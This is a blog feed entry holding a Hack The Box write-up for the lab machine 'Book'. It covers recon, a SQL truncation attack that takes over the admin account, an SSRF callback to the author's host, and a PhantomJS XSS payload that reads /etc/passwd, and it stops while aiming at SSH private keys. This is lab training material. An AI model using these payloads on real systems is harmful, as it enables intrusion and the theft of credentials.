<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-12T15:57:50+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">hazelnut’s blog</title><subtitle>Just trying out blogging</subtitle><entry><title type="html">Hack The Box - Book</title><link href="http://localhost:4000/hackthebox/sql/phantomjs/logrotten/linux/ssh/2020/07/12/book-htb.html" rel="alternate" type="text/html" title="Hack The Box - Book" /><published>2020-07-12T05:31:00+03:00</published><updated>2020-07-12T05:31:00+03:00</updated><id>http://localhost:4000/hackthebox/sql/phantomjs/logrotten/linux/ssh/2020/07/12/book-htb</id><content type="html" xml:base="http://localhost:4000/hackthebox/sql/phantomjs/logrotten/linux/ssh/2020/07/12/book-htb.html">&lt;p&gt;&lt;img src=&quot;/assets/images/book.png&quot; alt=&quot;&quot; height=&quot;414px&quot; width=&quot;615px&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;configuration&quot;&gt;Configuration&lt;/h1&gt;

&lt;p&gt;The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM.&lt;/p&gt;

&lt;p&gt;What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.176 book.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h1&gt;

&lt;p&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, we are able to determine the open ports and running services on the machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; book.htb
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-03-14 04:27 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;book.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.176&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;24.53 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;enumeration-1&quot;&gt;Enumeration (1)&lt;/h1&gt;

&lt;p&gt;Not much can be done with the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; service as we do not have any credentials on hand so lets come back to it later. As for the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service, maybe lets see what it has to offer ?&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://book.htb/&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We don’t have an account but lets sign up for one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Logging in brings us to what seems to be an online book collection.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://book.htb/home.php&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There was a page where we could upload our own books but it will be subjected to approval, which I believe is by the admin.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://book.htb/collections.php&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also see found the admin’s email &lt;code class=&quot;highlighter-rouge&quot;&gt;admin@book.htb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://book.htb/contact.php&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It took a while to look for a possible vector into the box but I happened to chance upon something on the login/register page where I saw a certain segment in the &lt;code class=&quot;highlighter-rouge&quot;&gt;javascript&lt;/code&gt; code where it does the validation of the user’s input when registering.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://book.htb/&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;validateForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;myForm&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;myForm&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Please fill name field. Should not be more than 10 characters&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Please fill email field. Should not be more than 20 characters&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This validation code is poorly implemented as even though the alerts informs the user of the character limit, it does not enforce it. Lets check if this is enfored on the server side. I decided to register a new account but with an email of length 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;admin@book.htb1234567&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After submitting the above request, I tried to logging in but failed due to wrong credentials. Is it possible that my email was truncated? I tried logging in one more time but with one character less, &lt;code class=&quot;highlighter-rouge&quot;&gt;admin@book.htb123456&lt;/code&gt;, and was successful! This seems like it is vulnerable to &lt;a href=&quot;https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SQL Truncation Attack&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If we try registering with the email &lt;code class=&quot;highlighter-rouge&quot;&gt;admin@book.htb%20%20%20%20%20%201&lt;/code&gt; and logging it with it, we login as &lt;code class=&quot;highlighter-rouge&quot;&gt;admin@book.htb&lt;/code&gt;!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, not much can be done but perhaps there is an admin page somewhere so lets brute-force some directories with &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://book.htb/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/big.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 12 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; .php
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://book.htb/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        12
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/wordlists/dirb/big.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403                                                                   	                                                                     
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:     php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2020/04/09 12:41:45 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/.htaccess &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/.htaccess.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/.htpasswd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/.htpasswd.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/admin &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/books.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/collections.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/contact.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/db.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/docs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/download.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/feedback.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/home.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/images &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/logout.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/profile.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/search.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/settings.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2020/04/09 12:51:57 Finished
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Seems like &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt; is what we are looking for.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fortunately for us, we already have the admin credentials so lets just login with it. However, there was only one page that caught my attention.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://book.htb/admin/collections.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Clicking on the &lt;code class=&quot;highlighter-rouge&quot;&gt;PDF&lt;/code&gt; link beside &lt;code class=&quot;highlighter-rouge&quot;&gt;User&lt;/code&gt; will download a &lt;code class=&quot;highlighter-rouge&quot;&gt;.pdf&lt;/code&gt; file containing a list of the usernames and emails in a table. Likewise, for the &lt;code class=&quot;highlighter-rouge&quot;&gt;PDF&lt;/code&gt; link beside &lt;code class=&quot;highlighter-rouge&quot;&gt;Collections&lt;/code&gt; will download a &lt;code class=&quot;highlighter-rouge&quot;&gt;.pdf&lt;/code&gt; file containing the list of books on the website.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems like the &lt;code class=&quot;highlighter-rouge&quot;&gt;.pdf&lt;/code&gt; files are generated on the fly but the question is how? I tried inject all sort of values but something stuck out: &lt;code class=&quot;highlighter-rouge&quot;&gt;HTML&lt;/code&gt; tags. Apparently, &lt;code class=&quot;highlighter-rouge&quot;&gt;HTML&lt;/code&gt; tags are being rendered when generating the &lt;code class=&quot;highlighter-rouge&quot;&gt;pdf&lt;/code&gt; files. This is what happens when I change my username to &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;h1&amp;gt;I am a H1&amp;lt;/h1&amp;gt;&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interesting… Lets see if we can perform &lt;code class=&quot;highlighter-rouge&quot;&gt;SSRF&lt;/code&gt; with this:&lt;/p&gt;

&lt;p&gt;First I start a &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; server on port 80 to receive the web request.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 80
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I then change my username to &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src =&quot;http://10.10.XX.XX&quot;&amp;gt;&lt;/code&gt; and download the &lt;code class=&quot;highlighter-rouge&quot;&gt;.pdf&lt;/code&gt; again. Sadly I did not get any request, probably because the name was truncated to probably 10 characters if you remember from registration validation code. Lets try to submit a book and use the &lt;code class=&quot;highlighter-rouge&quot;&gt;PDF&lt;/code&gt; link for &lt;code class=&quot;highlighter-rouge&quot;&gt;Collections&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This time, I put &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src =&quot;http://10.10.XX.XX&quot;&amp;gt;&lt;/code&gt; as the Book Title, uploaded a random file and then download the &lt;code class=&quot;highlighter-rouge&quot;&gt;.pdf&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;On my &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;, I caught the raw web request:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-raw&quot; data-lang=&quot;raw&quot;&gt;connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 55942
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: 10.10.XX.XX&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SSRF&lt;/code&gt; was successful but what caught my eye was the &lt;code class=&quot;highlighter-rouge&quot;&gt;PhantomJS&lt;/code&gt; in the User-Agent header.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-raw&quot; data-lang=&quot;raw&quot;&gt;PhantomJS is a headless web browser scriptable with JavaScript. It runs on Windows, macOS, Linux, and FreeBSD.

Using QtWebKit as the back-end, it offers fast and native support for various web standards: DOM handling, CSS selector, JSON, Canvas, and SVG.

The following simple script for PhantomJS loads Google homepage, waits a bit, and then captures it to an image.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;exploitation-1&quot;&gt;Exploitation (1)&lt;/h1&gt;

&lt;p&gt;From this &lt;a href=&quot;https://coderwall.com/p/5vmo1g/use-phantomjs-to-create-pdfs-from-html&quot;&gt;link&lt;/a&gt;, it states that &lt;code class=&quot;highlighter-rouge&quot;&gt;PhantomJS&lt;/code&gt; has the function to create PDFs from HTML. Cool! To exploit this, I followed this &lt;a href=&quot;https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/&quot;&gt;guide&lt;/a&gt; to read the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Submitting the following as my Book Title:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)};&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;file:///etc/passwd&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Returns this &lt;code class=&quot;highlighter-rouge&quot;&gt;pdf&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hmm…There is the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; service running on the machine and there is a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;reader&lt;/code&gt; with the home directory at &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/reader&lt;/code&gt;. Lets see if we can find any private keys in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/reader/.ssh&lt;/code&gt;, which are typically named as &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;

